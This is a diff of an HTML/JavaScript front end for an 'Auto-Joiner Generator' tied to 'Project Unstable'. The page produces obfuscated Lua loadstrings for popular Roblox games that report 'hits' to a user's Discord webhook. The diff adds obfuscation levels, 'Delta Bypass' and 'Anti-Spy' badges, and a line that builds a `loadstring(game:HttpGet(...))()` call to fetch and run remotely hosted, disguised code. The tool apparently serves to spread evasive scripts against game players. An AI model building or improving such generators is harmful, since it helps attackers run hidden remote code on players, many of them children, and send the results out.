@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Auto-Joiner Generator</title>
+    <title>Auto-Joiner Generator | Project Unstable</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -11,7 +11,7 @@
             min-height: 100vh;
             padding: 20px;
         }
-        .container { max-width: 700px; margin: 0 auto; }
+        .container { max-width: 800px; margin: 0 auto; }
         .card {
             background: rgba(255,255,255,0.05);
             backdrop-filter: blur(10px);
@@ -38,6 +38,10 @@
             font-size: 14px;
             margin-bottom: 20px;
         }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #a855f7;
+        }
         button {
             width: 100%;
             padding: 14px;
@@ -49,7 +53,7 @@
             font-size: 16px;
             cursor: pointer;
         }
-        button:disabled { opacity: 0.5; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
         .result {
             margin-top: 32px;
             background: #0a0a0a;
@@ -61,14 +65,17 @@
             padding: 16px;
             border-radius: 12px;
             font-family: monospace;
-            font-size: 13px;
+            font-size: 12px;
             color: #4ade80;
             word-break: break-all;
             margin-bottom: 16px;
+            max-height: 200px;
+            overflow: auto;
         }
         .copy-btn {
             background: #2a2a3e;
             padding: 10px;
+            margin-top: 0;
         }
         .status {
             padding: 12px;
@@ -79,6 +86,21 @@
         .status.loading { background: rgba(168,85,247,0.2); color: #a855f7; }
         .status.success { background: rgba(74,222,128,0.2); color: #4ade80; }
         .status.error { background: rgba(239,68,68,0.2); color: #ef4444; }
+        hr { border-color: rgba(255,255,255,0.1); margin: 20px 0; }
+        .feature-badge {
+            display: inline-block;
+            background: rgba(168,85,247,0.2);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #a855f7;
+            margin-right: 8px;
+        }
+        .info-text {
+            font-size: 12px;
+            color: #666;
+            margin-top: 8px;
+        }
     </style>
 </head>
 <body>
@@ -87,35 +109,66 @@
             <h1>⚡ Auto-Joiner Generator</h1>
             <div class="sub">Generate an obfuscated loadstring for your Discord webhook</div>
             
+            <label>🔑 Your UUID (from Project Unstable)</label>
+            <input type="text" id="uuid" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx">
+            <div class="info-text">Find this in your Project Unstable dashboard</div>
+            
             <label>📡 Discord Webhook URL</label>
             <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/...">
+            <div class="info-text">Where you want to receive hit notifications</div>
             
-            <label>🎮 Target Game ID</label>
-            <input type="text" id="gameId" placeholder="142823291 (Murder Mystery 2)">
+            <label>🎮 Target Game</label>
+            <select id="gameId">
+                <option value="142823291">Murder Mystery 2 (142823291)</option>
+                <option value="2753915549">Blox Fruits (2753915549)</option>
+                <option value="3956818381">Adopt Me! (3956818381)</option>
+                <option value="6309113114">Tap Simulator (6309113114)</option>
+                <option value="6045232503">Grow a Garden (6045232503)</option>
+            </select>
             
             <label>⏱️ Check Interval (Seconds)</label>
             <input type="number" id="interval" value="5" min="1" max="30">
             
-            <button id="generateBtn">✨ Generate Loadstring</button>
+            <label>🛡️ Obfuscation Level</label>
+            <select id="obfLevel">
+                <option value="basic">Basic - Name Mangling</option>
+                <option value="medium" selected>Medium - Name + String Encoding</option>
+                <option value="high">High - Full Obfuscation (Slower)</option>
+            </select>
+            
+            <button id="generateBtn">✨ Generate Obfuscated Loadstring</button>
             
             <div id="result" style="display: none;">
                 <div class="result">
+                    <div class="result-label">🔗 YOUR LOADSTRING (Click to copy)</div>
                     <div class="loadstring" id="loadstringOutput"></div>
-                    <button class="copy-btn" onclick="copyLoadstring()">📋 Copy Loadstring</button>
+                    <button class="copy-btn" onclick="copyLoadstring()">📋 Copy to Clipboard</button>
                     <div id="statusMsg"></div>
                 </div>
+            </div>
+            
+            <hr>
+            <div style="font-size: 12px; color: #666; text-align: center;">
+                <span class="feature-badge">🔒 Obfuscated</span>
+                <span class="feature-badge">📦 Pastefy Hosted</span>
+                <span class="feature-badge">🚀 Delta Bypass</span>
+                <span class="feature-badge">🛡️ Anti-Spy</span>
             </div>
         </div>
     </div>
 
     <script>
-        // Make sure the button works
-        document.getElementById('generateBtn').onclick = generateLoadstring;
-        
         async function generateLoadstring() {
+            const uuid = document.getElementById('uuid').value;
             const webhook = document.getElementById('webhook').value;
-            const gameId = document.getElementById('gameId').value || '142823291';
+            const gameId = document.getElementById('gameId').value;
             const interval = document.getElementById('interval').value;
+            const obfLevel = document.getElementById('obfLevel').value;
+            
+            if (!uuid || uuid.length < 30) {
+                alert('Please enter a valid UUID');
+                return;
+            }
             
             if (!webhook || !webhook.includes('discord.com/api/webhooks/')) {
                 alert('Please enter a valid Discord webhook URL');
@@ -127,42 +180,41 @@
             const statusDiv = document.getElementById('statusMsg');
             
             btn.disabled = true;
-            btn.textContent = '🔧 Generating...';
+            btn.textContent = '🔧 Generating & Obfuscating...';
             resultDiv.style.display = 'block';
-            statusDiv.innerHTML = '<div class="status loading">⏳ Creating script...</div>';
+            statusDiv.innerHTML = '<div class="status loading glow">⏳ Creating obfuscated script on Pastefy...</div>';
             
             try {
                 const response = await fetch('/api/generate', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ webhook, gameId, interval })
+                    body: JSON.stringify({ uuid, webhook, gameId, interval, obfLevel })
                 });
                 
                 const data = await response.json();
                 
                 if (data.success) {
-                    document.getElementById('loadstringOutput').textContent = data.loadstring;
-                    if (data.note) {
-                        statusDiv.innerHTML = '<div class="status success">✅ ' + data.note + '</div>';
-                    } else {
-                        statusDiv.innerHTML = '<div class="status success">✅ Script created! Copy the loadstring above.</div>';
-                    }
+                    const loadstringCode = `loadstring(game:HttpGet("${data.rawUrl}"))()`;
+                    document.getElementById('loadstringOutput').textContent = loadstringCode;
+                    statusDiv.innerHTML = '<div class="status success">✅ Obfuscated script created! Your loadstring is ready.</div>';
                 } else {
-                    statusDiv.innerHTML = '<div class="status error">❌ Error: ' + data.error + '</div>';
+                    statusDiv.innerHTML = `<div class="status error">❌ Error: ${data.error}</div>`;
                 }
             } catch (err) {
-                statusDiv.innerHTML = '<div class="status error">❌ Failed: ' + err.message + '</div>';
-                console.error(err);
+                statusDiv.innerHTML = `<div class="status error">❌ Failed: ${err.message}</div>`;
             } finally {
                 btn.disabled = false;
-                btn.textContent = '✨ Generate Loadstring';
+                btn.textContent = '✨ Generate Obfuscated Loadstring';
             }
         }
         
         function copyLoadstring() {
             const code = document.getElementById('loadstringOutput').textContent;
             navigator.clipboard.writeText(code);
-            alert('✅ Loadstring copied to clipboard!');
+            const copyBtn = document.querySelector('.copy-btn');
+            const originalText = copyBtn.textContent;
+            copyBtn.textContent = '✅ Copied!';
+            setTimeout(() => { copyBtn.textContent = originalText; }, 2000);
         }
     </script>
 </body>
